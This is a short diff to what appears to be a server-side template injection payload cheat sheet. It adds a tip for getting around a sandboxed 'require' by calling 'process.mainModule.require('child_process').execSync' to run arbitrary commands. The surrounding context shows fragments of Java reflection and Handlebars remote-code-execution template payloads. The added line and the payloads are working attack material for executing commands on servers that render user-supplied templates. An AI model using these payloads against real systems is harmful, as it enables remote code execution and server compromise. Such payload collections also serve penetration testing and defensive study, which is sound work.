@@ -313,6 +313,8 @@ ${object.getClass().getConstructors()}
 {{/with}}
 ```
 
+> **If `require` throws ReferenceError** (sandboxed/restricted env): use `process.mainModule.require('child_process').execSync('COMMAND').toString()` instead.
+
 ### Alternative Handlebars RCE
 ```handlebars
 {{#with "constructor" as |String|}}
